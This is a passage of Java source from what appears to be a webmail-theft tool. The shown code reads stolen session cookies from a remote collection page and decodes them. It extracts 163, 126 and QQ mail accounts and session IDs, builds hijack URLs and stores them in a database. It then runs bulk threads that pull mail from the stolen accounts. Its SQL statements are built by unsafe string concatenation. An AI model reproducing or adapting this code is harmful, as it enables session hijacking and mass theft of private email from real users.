                        if ((cookieindex = strHtml.indexOf("<td width=\"200")) != -1)
                        {
                            cookiedata = putstr(strHtml, "#FFFFFF\">", "</td>", cookieindex);
                            BASE64Decoder base64=new BASE64Decoder();
                            byte[] CookieArray=base64.decodeBuffer(cookiedata);
                            cookiedata=new String(CookieArray,encoding);
                            
                            if ((typeindex = cookiedata.indexOf("@163.com")) != -1)
                            {
                                user = putstr(cookiedata, "mail_uid=", "@163.com", 1);
                                user=user+"@163.com";
                            }
                            if ((typeindex = cookiedata.indexOf("@126.com")) != -1)
                            {
                                user = putstr(cookiedata, "mail_uid=", "@126.com", 1);
                                user=user+"@126.com";
                            }
                            
                        }
                        index++;
			
                    
                    String selsql = "select count(*) from emailcookies where ID="+"'"+browser+"'";
                    sqlbool=Excutesql(selsql);
                    if(sqlbool==1)
                    {
                        return;
                    }

                    if(user.indexOf("163") != -1)
                    {
                        MailType="163";
                        if ((cookieindex = cookiedata.indexOf("mail_host")) != -1) 
                        {
                            urltemp = putstr(cookiedata, "=", "com", cookieindex); 
                        }
                        else
                        {
                            urltemp="twebmail.mail.163.";
                        }
                         if ((cookieindex = cookiedata.indexOf("Coremail=")) != -1) 
                        {
                             sid = putstr(cookiedata, "%", "%", cookieindex); 
                        }
                        url="http://"+urltemp+"com/js5/main.jsp?sid="+sid;
               
                     }
                     if(user.indexOf("126") != -1)
                    {
                         MailType="126";
                        if ((cookieindex = cookiedata.indexOf("mail_host")) != -1) 
                        {
                             urltemp = putstr(cookiedata, "=", "com", cookieindex);
                             if(urltemp.isEmpty())
                             {
                                 urltemp="mail.126.";
                             }
                        }
                        else
                        {
                             urltemp="mail.126.";
                        }
                         
                        if ((cookieindex = cookiedata.indexOf("Coremail=")) != -1) 
                        {
                            sid = putstr(cookiedata, "%", "%", cookieindex); 
                        }
                        url="http://"+urltemp+"com/js5/main.jsp?sid="+sid;
                    //jTextFieldUrl.setText(url);
                    }
                     String sql = "insert into emailcookies(ID,user,cookie,url,IP,Date,Browser,logo,RevLogo,RevState,MailType)" +
                        " values ('"+browser+"','"+user+"','"+cookiedata+"','"+url+"','"+ip+"','"+Date+"','"+browser+"','"+logo+"','"+RevLogo+"','"+Revstate+"','"+MailType+"')";
                    if(Excutemdl(sql)==1)
                    {
                        this.ShowMessage("系统提示:获取到Cookie!");
                        this.ShowMessage("系统提示:添加成功！");
                        this.RefashCookie();
                        rectest=true;
                        
                        
                        }
                    else
                    {
                        return;
                        //this.ShowMessage("系统提示:添加失败！");
                    }
                    }
                        }
                    } catch (HttpException e) {
			// TODO Auto-generated catch block
                                e.printStackTrace();
                     } catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
                     }
        
        
        return;
    }
    public void GetqqCookiedata() {
        
	String strHtml = "";
        String CookieHtml="";
	int index=0; 
        int cookieindex;
        int typeindex;
        int sqlbool;
        String LoginUrl="";
        
        LoginUrl = CookiesiteUrl;

        rectest=false;
	try {
            
            CookieHtml = getRequest(LoginUrl);
        if(CookieHtml.indexOf("url=indexcookie.asp")!=-1)
        {
            ShowMessage("系统提示:自动获取qq后台cookie");
        }
                CookiesiteUrl=CookiesiteUrl+"?page=1";
		CookieHtml = getRequest(CookiesiteUrl);
		if (CookieHtml.indexOf("indexcookie.asp") != -1) 
                {
                    String urltemp="";
                    String sid="";
                    String cookiedata="";
                    String user="";
                    String ip="";
                    String browser="";
                    String logo="";
                    String MailType="";
                    Date now = new Date(System.currentTimeMillis());
                     DateFormat date = DateFormat.getDateTimeInstance();
                     String Date = date.format(now);
                     
                     
                     int RevLogo=0;
                     int Revstate=0;
                   // CookiesiteUrl=CookiesiteUrl.replace("logincookie.asp", "showcookie.asp");
                   // strHtml = getRequest(CookiesiteUrl);
                    while ((index = CookieHtml.indexOf("<tr align=\"center\">",index)) != -1) 
                    {
                       // CookieHtml = putstr(CookieHtml, "align=\"center\">", "type=\"submit\"", index);
                        
                       browser = putstr(CookieHtml, "<td width=\"73\" bgcolor=\"#FFFFFF\">", "</td>", index);
                        if(browser=="-1")
                            return; 
                       user = putstr(CookieHtml, "width=\"145\" bgcolor=\"#FFFFFF\">", "</td>", index);
                       cookiedata = putstr(CookieHtml, "width=\"425\" bgcolor=\"#FFFFFF\">", "</td>", index);
                       url="http://mail.qq.com/cgi-bin/login?fun=passport&from=webqq";  
                     //}
                        index++;
			
                    MailType="qq";
                    String selsql = "select count(*) from emailcookies where ID="+"'"+browser+"'";
                    sqlbool=Excutesql(selsql);
                    if(sqlbool==1)
                    {
                        return;
                    }
                     String sql = "insert into emailcookies(ID,user,cookie,url,IP,Date,Browser,logo,RevLogo,RevState,MailType)" +
                        " values ('"+browser+"','"+user+"','"+cookiedata+"','"+url+"','"+ip+"','"+Date+"','"+browser+"','"+logo+"','"+RevLogo+"','"+Revstate+"','"+MailType+"')";
                    if(Excutemdl(sql)==1)
                    {
                       // this.ShowMessage("系统提示:获取到Cookie!");
                       // this.ShowMessage("系统提示:添加成功！");
                        this.RefashCookie();
                        rectest=true;
                        
                        
                        }
                    else
                    {
                        return;
                        //this.ShowMessage("系统提示:添加失败！");
                    }
                    }
                     
                }
                    } catch (HttpException e) {
			// TODO Auto-generated catch block
                                e.printStackTrace();
                     } catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
                     }
        
        
        return;
    }
    /**
    * recv mail all
    */
    public void RecvAllAutoMail() 
    {
        int selectTab=jTabbedPaneKind.getSelectedIndex();                       //判断用户选中的标签类型
        if(selectTab==0)
        {
            this.SetRecvType(true);
            this.SetuserAllThreadMark(true);
            this.SetThreadmark(true);
            int usrRowcount=jTable_user.getRowCount();                              //判断表中有无数据
            if(0==usrRowcount)
            {
                JOptionPane.showMessageDialog( null, "该表内没有数据，请先添加数据！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
                for(int i=0;i<usrRowcount;i++)
                {

                    try
                    {
                        DefaultTableModel tableModel = (DefaultTableModel) jTable_user.getModel();
                        Object arg_id = tableModel.getValueAt(i, 0); // 取得第i行第一列的数据
                        ThreadPool.BeginRecThread(arg_id, recvType); //密码收邮线程
                        Thread.sleep(500);
                        this.initTable_User();
                    } 
                    catch (InterruptedException ex)
                    {
                        Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            }
        }
        else
        {
            this.SetRecvType(false);
            this.SetcookieAllThreadMark(true);
            this.SetThreadmark(true);
            int cookieRowcount=jTable_cookie.getRowCount();                            //判断用户是否选中行
            if(-1==cookieRowcount)
            {
                JOptionPane.showMessageDialog( null, "该表内没有数据，请先添加数据！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
                for(int j=0;j<cookieRowcount;j++)
                {
                    try
                    {
                        DefaultTableModel tableModel = (DefaultTableModel) jTable_cookie.getModel();
                        Object arg_id = tableModel.getValueAt(j, 0); // 取得第i行第一列的数据
                        ThreadPool.BeginRecThread(arg_id, recvType); //cookie收邮线程
                        Thread.sleep(500);
                        this.initTable_Cookie();
                    }
                    catch (InterruptedException ex)
                    {
                        Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            }
        }
    }
}

